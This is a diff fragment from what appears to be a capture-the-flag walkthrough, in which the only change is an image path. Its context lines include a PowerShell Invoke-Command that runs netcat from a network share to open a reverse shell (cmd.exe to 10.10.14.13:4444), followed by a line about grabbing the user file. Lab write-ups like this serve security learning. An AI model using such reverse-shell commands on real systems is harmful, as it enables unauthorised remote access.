@@ -131,7 +131,7 @@ Invoke-Command -Computer localhost -ScriptBlock { whoami } -Credential $cred
 Invoke-Command -Computer localhost -ScriptBlock { \\10.10.14.13\share\nc64.exe -e cmd.exe 10.10.14.13 4444 } -Credential $cred
 ```
 
-<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (149) (5).png" alt=""><figcaption></figcaption></figure>
 
 Now, we can execute `nc.exe` file to get another reverse shell and grab the user file.
 
